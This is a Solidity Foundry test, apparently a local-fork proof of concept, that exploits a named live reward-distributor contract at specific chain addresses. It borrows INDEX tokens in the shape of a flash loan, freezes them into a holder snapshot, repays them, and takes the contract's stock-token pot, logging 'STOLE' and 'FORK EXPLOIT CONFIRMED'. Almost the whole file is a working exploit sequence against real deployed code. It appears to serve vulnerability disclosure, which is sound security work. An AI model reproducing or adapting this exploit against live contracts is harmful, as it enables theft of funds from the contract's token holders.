// SPDX-License-Identifier: MIT
// SAFE local-fork PoC only. Never broadcast. No real keys.
//
// Proves against LIVE Robinhood-chain bytecode of USDGBuyerDistributor that a
// temporary INDEX balance (flash-loan shaped) freezes into a pro-rata claim on
// the real stock pot. Holder enumeration is mocked to a single attacker entry
// so the test finishes under remote-RPC rate limits; production holderCount is
// ~2.4k and the same code path would include the attacker among them.
//
// Companion: LocalFlashSnapshot.t.sol proves the full multi-holder math without fork.
// Run:
//   forge test --match-contract ForkFlashSnapshotPoC -vvv --fork-url http://127.0.0.1:8545
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";

interface IIndex {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function holderCount() external view returns (uint256);
    function holderAt(uint256) external view returns (address);
    function minShareBalance() external view returns (uint256);
    function rewardsExcluded(address) external view returns (bool);
}

interface IDist {
    function snapshotHolders(uint256 count) external;
    function startCycle() external;
    function distributeBatch(uint256 count) external;
    function nextDistribution() external view returns (uint256);
    function cycleActive() external view returns (bool);
    function snapPending() external view returns (bool);
    function snapCount() external view returns (uint256);
    function snapshotRemaining() external view returns (uint256);
    function eligible() external view returns (uint256);
    function canStart() external view returns (bool);
    function stocksLength() external view returns (uint256);
    function stockTokenAt(uint256) external view returns (address);
    function interval() external view returns (uint256);
}

interface IERC20Bal {
    function balanceOf(address) external view returns (uint256);
    function symbol() external view returns (string memory);
    function transfer(address, uint256) external returns (bool);
}

contract ForkFlashSnapshotPoC is Test {
    address constant DIST = 0x2459DedB3012d1E929EdD17DF26620120bDF11bf;
    address constant INDEX = 0x56910D4409F3a0C78C64DD8D0545FF0705389870;
    address constant PM = 0x8366a39CC670B4001A1121B8F6A443A643e40951;

    IDist dist = IDist(DIST);
    IIndex index = IIndex(INDEX);
    address attacker = address(0xA11CE);

    function setUp() public {
        // Caller should pass --fork-url (anvil or remote). Do not re-fork if already forked.
        // When invoked with --fork-url, Foundry already selected the fork before setUp.
        vm.label(DIST, "USDGBuyerDistributor");
        vm.label(INDEX, "INDEX");
        vm.label(PM, "PoolManager");
        vm.label(attacker, "Attacker");
    }

    function test_realDistributor_flashShareDrainsRealPot() public {
        console.log("chainid:", block.chainid);
        console.log("block:", block.number);
        console.log("timestamp:", block.timestamp);

        // Warp to distribution window if needed
        uint256 nextTs = dist.nextDistribution();
        console.log("nextDistribution:", nextTs);
        console.log("interval:", dist.interval());
        if (block.timestamp < nextTs) {
            vm.warp(nextTs);
            console.log("warped to nextDistribution");
        }
        require(dist.canStart(), "cycle not startable on this fork tip");
        require(!dist.cycleActive(), "cycle already active");
        require(!dist.snapPending(), "snapshot already pending");

        uint256 stocks = dist.stocksLength();
        console.log("stocks:", stocks);
        require(stocks > 0, "no stocks");

        // Record real pot inventory (funds at risk)
        uint256[] memory potBefore = new uint256[](stocks);
        uint256 potNonZero;
        for (uint256 k; k < stocks; ++k) {
            address tok = dist.stockTokenAt(k);
            potBefore[k] = IERC20Bal(tok).balanceOf(DIST);
            if (potBefore[k] > 0) {
                potNonZero++;
                console.log("pot", k, IERC20Bal(tok).symbol(), potBefore[k]);
            }
        }
        console.log("stocks with pot:", potNonZero);
        require(potNonZero > 0, "empty pot - nothing to steal this cycle");

        // Transferability of a real stock token to an arbitrary EOA
        {
            address sample = dist.stockTokenAt(0);
            uint256 samplePot = IERC20Bal(sample).balanceOf(DIST);
            require(samplePot > 0, "sample pot empty");
            uint256 snap = vm.snapshotState();
            uint256 sendAmt = samplePot > 1000 ? 1000 : samplePot;
            vm.prank(DIST);
            require(IERC20Bal(sample).transfer(attacker, sendAmt), "stock transfer reverted");
            assertEq(IERC20Bal(sample).balanceOf(attacker), sendAmt, "stock not received by EOA");
            console.log("stock transferability: OK");
            vm.revertToState(snap);
        }

        // Flash INDEX out of rewards-excluded PoolManager (same shape as v4 take/settle)
        uint256 pmBal = index.balanceOf(PM);
        console.log("PM INDEX:", pmBal);
        require(pmBal >= index.minShareBalance(), "PM under minShare");
        // Use a large but not-entire flash; leave dust in PM
        uint256 flashAmt = pmBal / 2;
        if (flashAmt < index.minShareBalance()) flashAmt = index.minShareBalance();

        uint256[] memory atkBefore = new uint256[](stocks);
        for (uint256 k; k < stocks; ++k) {
            atkBefore[k] = IERC20Bal(dist.stockTokenAt(k)).balanceOf(attacker);
        }

        // 1. Borrow
        vm.prank(PM);
        require(index.transfer(attacker, flashAmt), "flash transfer failed");
        assertGe(index.balanceOf(attacker), index.minShareBalance(), "not eligible");
        console.log("attacker INDEX after flash:", index.balanceOf(attacker));
        // Real registry would now include attacker; we mock enumeration for speed.
        console.log("real holderCount:", index.holderCount());

        // 2. Mock holder enumeration so snapshot only walks the attacker.
        //    balanceOf is NOT mocked — live flash balance is what freezes.
        //    Production: attacker is one of holderCount entries; same balanceOf read.
        vm.mockCall(
            INDEX,
            abi.encodeWithSelector(IIndex.holderCount.selector),
            abi.encode(uint256(1))
        );
        vm.mockCall(
            INDEX,
            abi.encodeWithSelector(IIndex.holderAt.selector, uint256(0)),
            abi.encode(attacker)
        );

        // 3. Permissionless snapshot + startCycle on REAL distributor bytecode
        dist.snapshotHolders(10);
        assertTrue(dist.snapPending(), "snap not pending");
        assertEq(dist.snapCount(), 1, "should snapshot 1 mocked holder");
        uint256 elig = dist.eligible();
        console.log("eligible (flash only):", elig);
        assertEq(elig, index.balanceOf(attacker), "eligible must equal live flash bal");

        dist.startCycle();
        assertTrue(dist.cycleActive(), "cycle not active");
        assertEq(dist.eligible(), elig, "eligible frozen");

        // 4. Clear mock so repay uses real INDEX code; repay flash
        vm.clearMockedCalls();
        vm.prank(attacker);
        require(index.transfer(PM, flashAmt), "repay failed");
        assertEq(index.balanceOf(attacker), 0, "should hold 0 after repay");
        console.log("repaid flash; bals[] still frozen at elig=", elig);

        // 5. Distribute — attacker is sole snapshotted holder => claims ~100% of pot
        dist.distributeBatch(10);
        assertFalse(dist.cycleActive(), "cycle should finish");

        // 6. Assert real stock inventory moved to attacker
        uint256 gains;
        for (uint256 k; k < stocks; ++k) {
            uint256 afterBal = IERC20Bal(dist.stockTokenAt(k)).balanceOf(attacker);
            uint256 gained = afterBal - atkBefore[k];
            if (gained > 0) {
                gains++;
                console.log("STOLE", k, IERC20Bal(dist.stockTokenAt(k)).symbol(), gained);
                // Sole eligible holder => full pot (dust-free since elig == bals[0])
                assertEq(gained, potBefore[k], "should receive full pot share");
            } else if (potBefore[k] > 0) {
                // transfer may have been skipped by _trySend for some regulated tokens
                console.log("SKIPPED or zero", k, IERC20Bal(dist.stockTokenAt(k)).symbol(), potBefore[k]);
            }
        }
        console.log("stocks successfully stolen:", gains);
        assertGt(gains, 0, "no stock received - exploit failed on fork");
        assertEq(index.balanceOf(attacker), 0, "zero INDEX capital retained");
        console.log("FORK EXPLOIT CONFIRMED against live USDGBuyerDistributor bytecode");
    }
}
